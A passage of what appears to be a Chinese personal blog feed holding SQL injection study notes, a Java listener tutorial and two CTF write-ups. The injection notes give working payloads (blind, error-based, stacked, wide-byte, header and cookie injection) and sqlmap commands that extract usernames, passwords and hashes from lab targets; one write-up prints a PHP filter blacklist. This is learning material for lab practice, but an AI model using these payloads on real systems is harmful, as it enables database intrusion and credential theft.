if(1=1,sleep(5),1)—+//若1=1，sleep(5);else</p><p>有延时，说明id是字符型</p><h3 id="进行盲注"><a href="#进行盲注" class="headerlink" title="进行盲注"></a>进行盲注</h3><p>示例:?id=1’ and if(&gt;123,sleep(5),1)—+</p><p>获取数据库版本号</p><p>?id=1’ and if(ascii(mid((select version()),1,1//字符串截取函数,类似于substr))&gt;50),sleep(5),1)—+ </p><p>?id=1’ and if(ascii(mid((select table_name from information_schema.tables),1,1))&gt;50),sleep(5),1)—+ </p><h2 id="24-floor报错注入原理"><a href="#24-floor报错注入原理" class="headerlink" title="24 floor报错注入原理"></a>24 floor报错注入原理</h2><p>十种MySQL报错注入</p><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>1.rand()产生伪随机数的数列 随机产生0-1中间的数</p><p>rand(seed)</p><p>2.count(*)</p><p>select count(*) from floortest 查询表下有多少列</p><p>3.group by 分组</p><p>select * from floortest group by name</p><p>以name列为基准分组 name下重复的归到一组</p><p>select count(*),name from floortest group by name</p><p>4.floor()</p><p>向下取整  floor(2.99) -&gt; 2</p><p> rand(0) seed=0 整条语句结果是固定的随机数</p><p>select floor(rand(0)*2);  -&gt; 0</p><p>select floor(rand(0)*2) from floortest; -&gt;产生0和1两种结果</p><p>5.count(*)+group by创建虚拟表</p><p>会根据数据的需要，临时建立一个虚拟表，来进行计数</p><div class="table-container"><table><thead><tr><th>key</th><th>count（*）</th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td>1</td><td>1</td></tr><tr><td>0</td><td>1</td></tr></tbody></table></div><p>查询时 先查询表中key有无此数据，若没有，插入这个数据；若有，+1</p><p>第一个数为0  查询虚拟表中没有 插入floor(rand(0)*2) 语句再执行一次 变为1 所以插入key=1</p><p>第二个数为1 查询表中有1 count=1+1</p><p>第三个数为0 查询虚拟表中没有 插入floor(rand(0)*2) 又变为1 </p><p>此时报错 Duplicate entry’1’ for key’group_key’</p><p> //键’group_key’的重复条目’1’</p><p>select count(<em>),concat(user(),floor(rand(0)\</em> 2)) from floortest group by concat(user(),floor(rand(0)*2))</p><p>select count(<em>),concat(user(),floor(rand(0)\</em>2))x from floortest group by x  //给concat(user(),floor(rand(0)*2))设置别名x，直接用x代表</p><p>若不知道表名可以使用</p><p>select count(<em>),concat(user(),floor(rand(0)\</em>2))x from information_schema.tables group by x</p><p>由于上面的语句查询出来的结果是一张表，必须将其变为具体数值(true false)才能与and进行操作，只能是布尔值，需要在嵌套一次查询</p><p>select <em> from floortest where id=1 and **(select 1 from(select count(</em>),concat(user(),floor(rand(0)*2))) x from information_schema.tables group by x)a);**</p><p>需要给(select count(<em>),concat(user(),floor(rand(0)\</em>2))) x from information_schema.tables group by x)表添加一个别名a</p><h2 id="25-floor报错注入利用演示"><a href="#25-floor报错注入利用演示" class="headerlink" title="25 floor报错注入利用演示"></a>25 floor报错注入利用演示</h2><p>查询数据库名</p><p>?id=1’) and(select 1 from(select count(*),concat( database(),floor(rand(0)*2))a from information_schema.tables group by a)x)—+</p><p>>‘security1’</p><p>查询表名</p><p>?id=1’) and (select 1 from(select count(<em>),concat(==(select table_name from information_schema.tables where table_schema=’security’ limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p><p>查询列名</p><p>?id=1’) and (select 1 from(select count(<em>),concat(==(select column_name from information_shcema.columns where table_schema=’security’ and table_name=’users’ limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p><p>查询到两列 username和password</p><p>查询数据</p><p>?id=1’) and (select 1 from(select count(<em>),concat(==(select username from users  limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p><p>?id=1’) and (select 1 from(select count(<em>),concat(==(select password from users  limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p><h2 id="26-extractvalue-和updatexml-报错注入"><a href="#26-extractvalue-和updatexml-报错注入" class="headerlink" title="26 extractvalue()和updatexml()报错注入"></a>26 extractvalue()和updatexml()报错注入</h2><h3 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h3><p>extractvalue()有两个参数</p><p>updatexml()有三个参数</p><p>两个函数都是在第二个位置的参数上进行修改注入</p><p>这两个函数都是用来处理xml文档的</p><p>报错都是xml语法错误</p><p>只要两个函数的第二个参数不符合xml语法，就会发生报错</p><p>?id=1’ and (updatexml(1,concat(0x7e,(select database()),0x7e),1))—+</p><p>?id=1’ and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=’security ‘ limit 0,1),0x7e),1))—+</p><p>通过两个函数查询时需注意：查询数据长度限制在32位之内，如果超过32位</p><p>可以使用left() right() substr() 通过截取长度分段显示出来</p><h2 id="26-堆叠注入"><a href="#26-堆叠注入" class="headerlink" title="26 堆叠注入"></a>26 堆叠注入</h2><p>利用;隔开</p><p>和union注入的区别</p><p>and 1=1—+成立 and 1=2— +不成立来判断是否可以注入</p><p>order by 判断字段数 ==？==</p><p>?id=-888’ union select 1,2,3==?把888注释掉==</p><p>?=id=-888‘ union select 1,2,3;select sleep(5)—+</p><p>?=id=-888‘ union select ‘~‘,database(),’~’—+</p><p>?=id=-888‘ union select ‘~‘,table_name,’~’ from information_schema.tables where table_schema=’test’—+</p><p>?=id=-888‘ union select ‘~‘,column_name,’~’ from information_schema.columns where table_schema=’test’ and table_name=’floor_test’—+</p><p>更改数据</p><p>?id=-888’;update floortest set name=’change’ where id=6 —+</p><p>还可以进行delect/插入操作</p><p>原理：php使用PDO编译，存在堆叠注入，可以执行多条sql语句</p><p>union注入只能进行查询操作</p><h2 id="27-二次注入"><a href="#27-二次注入" class="headerlink" title="27 二次注入"></a>27 二次注入</h2><p>攻击者在注册的地方构造恶意的sql语句，提交到服务器储存到数据库中</p><p>注册 username:admin’# password:123456</p><p>修改admin’#的密码</p><p>查看数据库发现admin’#密码未被改变 而admin密码改变</p><p>原理：</p><p>修改密码源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'"</span>;</span><br></pre></td></tr></table></figure><p>实际修改了admin的密码 并且’ and password=’$curr_pass’被注释了</p><p>这样就可以实现随意指定用户名而不用知道他的密码 修改其密码</p><h2 id="28-宽字节注入"><a href="#28-宽字节注入" class="headerlink" title="28 宽字节注入"></a>28 宽字节注入</h2><p>一.什么是宽字节注入</p><p>宽字节注入是因为gbk编码方式需要两个ascii码组合来解码，所以形象的叫做宽字节</p><p>二.宽字节注入的条件</p><p>1)数据库查询设置为GBK编码</p><p>2)addslashes(),mysql_real_escape_string(),mysql_escape_string()这类的过滤函数(会对输入的字符串产生过滤操作)</p><p>两条同时满足</p><p>三、原理</p><p>假设我们传递一个参数id=1’ 会被认为单引号是不合法的，会被过滤函数添加转义”\”给过滤掉。要想程序接受我们传递的参数中包含单引号，就需要把转义字符给干掉</p><p>当http协议传输时，要经过url编码的（空格变为%20，单引号变为 %27），如果这个编码完成后，传递到服务器，==有奇数个数==（有奇数个url编码），它会把前边偶数个数的字符当gbk编码去解码，那么剩下的就当普通的url去解码，所以我们就可以在单引号之前添加一个%81这样的编码，这样到最后解码的时候，这个%81就会和”\”对应的编码相结合按照gvk的要求去解码，最后就只剩下个单引号。</p><p>四、实例</p><p>%5c表示反斜杠</p><p>?id=1’</p><p>提交过后 1%5c%27</p><p>?id=1%81’</p><p>提交过后 1%81%5c%27</p><p>由于gbk编码特性,%81%5c组合，%27解码成单引号</p><p>发生报错，说明成功干扰，%81%5c解码成中文</p><p>按照正常流程进行注入</p><p>进行union,order by下一步操作</p><p>?id=1%81’ union select 1,2,3—+</p><p>页面不显示，如果想将联合查询的内容显示到页面上</p><p>?id=-1%81’ union select 1,2,3—++</p><p>前面的-1查询不到，就会把后面的内容显示到页面上</p><p>在2,3位置查询user() database()</p><p>进行后续系列操作</p><p>注意：table_schema=’security’又被转义，这时不能通过宽字节注入，因为对应的数据库名前对加上汉字，可以转换字符串为对应的十六进制0x+就可以解决问题</p><p>五、其他</p><p>若想将网页修改为gbk编码方式：更多-&gt;文字编码-&gt;简体中文</p><p>gbk编码是由两个ascii字符来解码的，gbk编码汉字是从%81开始的</p><p>从81开始都可以到FE结束，都可以达到编码效果</p><h2 id="29-UserAgent、Referer、Cookie注入"><a href="#29-UserAgent、Referer、Cookie注入" class="headerlink" title="29 UserAgent、Referer、Cookie注入"></a>29 UserAgent、Referer、Cookie注入</h2><p>注入点不仅存在与get/post传参，请求包头部字段user-agent/referer/cookie/x-forwarded-for(头部字段名)都有可能发生sql注入</p><h3 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h3><p>使用burp抓包分析请求报文</p><p>将抓到的post请求包发送到repeater模块</p><p>通过更改User-agent的值查看页面回显</p><p>user-agent:aaa’ 使用闭合单引号发现出现报错，干扰了正常的sql语句</p><p>构造报错注入相关语句</p><p>使用—+和#都报错说明注释可能无法使用，改为</p><p>user-agent:aaaa’ and ‘1’=’1</p><p>使用常见的三种报错函数进行报错注入</p><p>user-agent: aaa’ and extractvalue(1,concat(0x7e,(select user()),0x7e)) and ‘1’=’1</p><p>后续进行sql注入</p><p><strong>select @@basedir为安装路径查询</strong></p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>Cookie:uname=admin</p><p>Cookie:uname=admin’ 产生报错</p><p>Cookie:uname=admin’ and ‘1’=’1</p><p>Cookie:uname=admin; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))</p><p>注意：取出数据的长度最多三十二位，如果想要完整显示出来，需要使用字符串截取函数分段显示出来</p><h2 id="30-通过注入漏洞获取账号密码登录后台网站"><a href="#30-通过注入漏洞获取账号密码登录后台网站" class="headerlink" title="30 通过注入漏洞获取账号密码登录后台网站"></a>30 通过注入漏洞获取账号密码登录后台网站</h2><p>?id=1’ 页面发生变化，变为空白</p><p>?id=1’—+ 页面保持空白，说明此处id类型不是字符型</p><p>?id=1 and 1=1 页面正常显示</p><p>这时看?id=1 and 1=2 若也正常显示，说明此处不存在注入点；不正常显示，判断为数字型的sql注入</p><p>?id=-1 union select 1,2,3,4</p><p>查出字段后 将查询值改为查不到的数值可以看到字段在哪里回显</p><h2 id="31-sqlmap简介与使用"><a href="#31-sqlmap简介与使用" class="headerlink" title="31 sqlmap简介与使用"></a>31 sqlmap简介与使用</h2><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，采用四种SQL注入技术：union注入，堆叠注入，报错注入，时间盲注，布尔盲注</p><p>sqlmap基于python2.7</p><h3 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h3><p><strong>判断是否存在注入</strong></p><p>①sqlmap -u <a href="http://193.112.113.137/sqlilbs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilbs/less-1?id=1</a></p><p>弹出it looks like the back-end DBMS is “MySQL”.Do you want to skip test payloads specific for other DBMSes?进行交互</p><p>(数据库可能是MySQL数据库，是否跳过检测其他数据库)</p><p>for the remaining tests,do you want to include all tests for ‘MySQL’ extending provided level(1) and risk(1) values?</p><p>(在level(1) and risk(1)情况下，是否使用Mysql所有的payload进行检测，默认即可)</p><p>②使用burpsuite抓包</p><p>将请求(Request-Raw)复制到kali中</p><p>创建文本文件vim sqlcheck.txt</p><p>sqlmap -r sqlcheck.txt</p><p>效果和①相同</p><p>当payload只有Id一个参数时不用加双引号，当有两个参数时，sqlmap -u “<a href="http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1</a>“ 使用＆并添加双引号</p><p><strong>查询当前用户下所有数据库</strong></p><p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> —dbs</p><p><strong>获取某个数据库中的表名</strong></p><p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获取哪一个数据库中的表名) security —tables(获取security数据库中所有表名)</p><p><strong>获取某张表中的字段名</strong></p><p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获数据库来定位)security -T users —columns</p><p><strong>获取字段里的数据</strong></p><p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获数据库来定位)security -T users -C id,username,password</p><p>—dump</p><p>需要获取的字段通过逗号连接 id,username,password</p><h2 id="32-sqlmap自动化注入实战"><a href="#32-sqlmap自动化注入实战" class="headerlink" title="32 sqlmap自动化注入实战"></a>32 sqlmap自动化注入实战</h2><p>首先判断注入点是否存在</p><p>sqlmap -u url</p><p>如果不确定注入点是否在get方式，可以把http请求保存到文本，sqlmap -r 在文本中读取http请求进行测试</p><p>读取当前所有数据库 —dbs</p><p>查看当前的数据库 sqlmap -u url —current -db</p><p>获取数据库中所有表</p><p>sqlmap -u url -D nonoi_col(数据库名) —tables</p><p>获取表里的字段</p><p>sqlmap -u url -D nonoi_col(数据库名) -T cat(表名) —columns</p><p>获取数据</p><p>sqlmap -u url -D nonoi_col -T cat -C cat_name,cid —dump</p><p>如果直接使用—dump</p><p>sqlmap -u url —dump</p><p> 自动把所有数据库中所有表给读取出来</p><p>并对相应的哈希值进行暴力破解</p><h2 id="33-sqlmap的使用以及load-file-读取目标系统文件"><a href="#33-sqlmap的使用以及load-file-读取目标系统文件" class="headerlink" title="33 sqlmap的使用以及load_file()读取目标系统文件"></a>33 sqlmap的使用以及load_file()读取目标系统文件</h2><h3 id="sqlmap连接需要登录的页面"><a href="#sqlmap连接需要登录的页面" class="headerlink" title="sqlmap连接需要登录的页面"></a>sqlmap连接需要登录的页面</h3><p>ipconfig查询本地ip</p><p>sqlmap -u “<a href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="noopener">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ —dbs</p><p>会显示sqlmap got a 302 redirect to ‘…’ 进行重定向</p><p>如果换一个浏览器，访问上述地址会首先判断是否登陆过系统</p><p>如果没有登录，就会跳转到登录页面登录</p><p>如果使用sqlmap遇到这种需要登录才能访问的页面，直接点击回车是不会测出任何结果</p><p>我们需要得到对应Cookie，获取cookie的几种方式</p><p>①f12-&gt;console(控制台)-&gt;输入js语句 document.cookie</p><p>会把当前用户的cookie信息打印下来</p><p>②burp抓包获取cookie</p><p>burp获取到的请求报文复制</p><p>vim cookie.txt(新建一个txt) 保存请求报文</p><p>sqlmap -r cookie.txt —dbs</p><p>也可以达到同样的效果</p><p>sqlmap -u “<a href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="noopener">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ —cookie=””  —dbs</p><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><p>1.查看正在连接的数据库</p><p>sqlmap -r cookie.txt —current-db</p><p>2.获取数据库用户的密码</p><p>sqlmap -r cookie.txt —passwords</p><p>列举出用户和密码哈希值 接着破解密码的哈希值</p><p>3.获取当前数据库的用户名称</p><p>sqlmap -r cookie.txt —current-user</p><p>4.判断当前用户是否为管理权限</p><p>sqlmap -r cookie.txt —is-dba</p><p>如果 DBA:True,说明有管理权限</p><p>5.测试等级 —level</p><p>分为五个等级</p><p>如果平时不加等级，默认的等级为 —level 1</p><p>6.whereis sqlmap查看sqlmap所在目录 </p><p>-&gt; cd  /usr/share/sqlmap </p><p>-&gt; cd xml/</p><p>-&gt; ls</p><p>-&gt;cd payloads</p><p>所有测试的payload都存储在该路径下的xml文件下，如果有自己想加入的测试路径，可以加入进来</p><p>如果使用—level 5是级别最高的，使用的payload最多的，会对自动破解Cookie,xff头部注入进行测试</p><p>运行速度很慢，最好不用使用最高等级</p><p>—level 2时会测试cookie相应注入</p><p>—level 3会测试 useragent </p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java学习(3)</title>
    <link href="/2020/11/30/java3/"/>
    <url>/2020/11/30/java3/</url>
    
    <content type="html"><![CDATA[<p>期末考试临时冲的，java的事件处理以及监听类的几个类别。</p><a id="more"></a><h2 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h2><h3 id="监听类"><a href="#监听类" class="headerlink" title="监听类"></a>监听类</h3><p>监听类的四种选择</p><ol><li><strong>选择本类</strong></li><li><strong>定义一个实现了接口XXXListener的新类作为监听类</strong></li><li><strong>定义一个继承于相应适配器类的新类作为监听类</strong></li><li><strong>匿名类 </strong></li></ol><h4 id="本类监听"><a href="#本类监听" class="headerlink" title="本类监听"></a>本类监听</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span> <span class="keyword">implements</span> <span class="title">XXXListener</span></span>&#123;</span><br><span class="line">    MyFrame()&#123;</span><br><span class="line">        组件名.addXXXListener(**<span class="keyword">this</span>**);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent arg0)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="定义一个实现接口的新类作为监听类"><a href="#定义一个实现接口的新类作为监听类" class="headerlink" title="定义一个实现接口的新类作为监听类"></a>定义一个实现接口的新类作为监听类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    MyListener listener = <span class="keyword">new</span> MyListener(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//想传递谁就把相应组件放在括号中</span></span><br><span class="line">    组件名.addXXXListener(listener);</span><br><span class="line">    <span class="comment">//监听类对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">implements</span> <span class="title">XXXListener</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>只要类声明实现接口，就必须重写定义接口的方法</strong></p><p><strong>若只想使用其中一个，其他的方法也不能删去</strong></p><h4 id="定义一个继承于相应适配器类的新类作为监听类"><a href="#定义一个继承于相应适配器类的新类作为监听类" class="headerlink" title="定义一个继承于相应适配器类的新类作为监听类"></a>定义一个继承于相应适配器类的新类作为监听类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    MyFrame()&#123;</span><br><span class="line">    MyListener listener = <span class="keyword">new</span> MyListener(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//想传递谁就把相应组件放在括号中</span></span><br><span class="line">    组件名.addXXXListener(listener);</span><br><span class="line">    <span class="comment">//监听类对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">extends</span> <span class="title">XXXAdapter</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与接口类不同的是，如果想处理某一方法，就在新类中重写这个方法</p><h4 id="选择匿名类作为监听类（最常见）"><a href="#选择匿名类作为监听类（最常见）" class="headerlink" title="选择匿名类作为监听类（最常见）"></a>选择匿名类作为监听类（最常见）</h4><h5 id="依赖于相应接口创建匿名类"><a href="#依赖于相应接口创建匿名类" class="headerlink" title="依赖于相应接口创建匿名类"></a>依赖于相应接口创建匿名类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    MyFrame()&#123;</span><br><span class="line">    组件名.addXXListener(<span class="keyword">new</span> XXXListener()&#123;</span><br><span class="line">        <span class="comment">//重写XXListener接口中定义的所有方法</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>new A类(){}表明了创建这个A类的子类（匿名类）的实例对象</p><p>new I接口(){}表明创建了一个匿名类实例，这个类是声明实现I接口的</p><p>new 接口(){}不是创建接口实例，接口是不能创建实例的</p><h5 id="依赖于适配器类创建匿名类"><a href="#依赖于适配器类创建匿名类" class="headerlink" title="依赖于适配器类创建匿名类"></a>依赖于适配器类创建匿名类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyFrame</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    MyFrame()&#123;</span><br><span class="line">        组件名.addXXListener(<span class="keyword">new</span> XXAdapter()&#123;</span><br><span class="line">            <span class="comment">//重写关注事件的相应方法</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BackupFile[ACTF2020 新生赛]</title>
    <link href="/2020/11/30/backupfile/"/>
    <url>/2020/11/30/backupfile/</url>
    
    <content type="html"><![CDATA[<p>源码泄露与php弱类型</p><a id="more"></a><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>常见的源码泄露</li><li>php弱类型</li></ul><h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><p>备份文件index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php弱类型:int和string无法直接比较，php将string转换为int再进行比较，转换方法：该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p><p>故使用get传参 key=123即可得到flag</p>]]></content>
    
    
    <categories>
      
      <category>web刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>源码泄露</tag>
      
      <tag>php弱类型</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hack World[CISCN2019 华北赛区 Day2 Web1]</title>
    <link href="/2020/11/30/hackworld/"/>
    <url>/2020/11/30/hackworld/</url>
    
    <content type="html"><![CDATA[<p>空格绕过与bool盲注二分查找</p><a id="more"></a><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>空格绕过</li><li>bool盲注二分查找</li></ul><h2 id="学到的新知识"><a href="#学到的新知识" class="headerlink" title="学到的新知识"></a>学到的新知识</h2><ul><li><p>空格被过滤可以使用tab</p><p>空格的绕过:<code>%09</code> <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>/**/</code> <code>/*!*/</code>或者直接tab</p></li><li><p>由于-被过滤，所以无法检测为什么类型的注入，可以通过2/1，1/1判断为数字型注入</p></li><li><p>mysql中if()函数的使用: 在mysql中if()函数的用法类似于java中的三目表达式，其用处也比较多，具体语法如下：</p><p>if(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，</p><p>则返回expr3的值。</p></li></ul><h2 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h2><p>使用burpsuite进行fuzz测试，发现还是Too many requests（复现平台有waf，一秒只能访问一次）</p><p>找到的本题源码，萌新学习一下php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbuser = <span class="string">'root'</span>;</span><br><span class="line">$dbpass = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    $blackList = <span class="keyword">array</span>(<span class="string">' '</span>, <span class="string">'||'</span>, <span class="string">'#'</span>, <span class="string">'-'</span>, <span class="string">';'</span>, <span class="string">'&amp;'</span>, <span class="string">'+'</span>, <span class="string">'or'</span>, <span class="string">'and'</span>, <span class="string">'`'</span>, <span class="string">'"'</span>, <span class="string">'insert'</span>, <span class="string">'group'</span>, <span class="string">'limit'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'*'</span>, <span class="string">'into'</span>, <span class="string">'union'</span>, <span class="string">'load_file'</span>, <span class="string">'outfile'</span>, <span class="string">'./'</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($blackList <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($sql, $blackitem)) &#123;<span class="comment">//在id中查找黑名单中的字符</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$db = mysql_connect(<span class="string">"localhost"</span>, $dbuser, $dbpass);<span class="comment">//面向过程连接mysql</span></span><br><span class="line"><span 